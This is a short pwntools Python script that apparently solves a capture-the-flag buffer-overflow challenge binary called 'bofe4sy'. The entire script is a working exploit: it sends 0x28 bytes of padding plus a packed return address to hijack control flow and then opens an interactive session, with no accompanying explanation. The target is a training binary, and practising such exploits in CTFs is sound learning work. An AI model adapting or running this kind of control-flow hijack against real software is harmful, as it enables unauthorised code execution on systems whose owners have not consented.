from pwn import *

r = process("./bofe4sy")

r.recvuntil("Read your input:")
r.sendline("a" * 0x28 + p64(0x400646))
r.interactive()
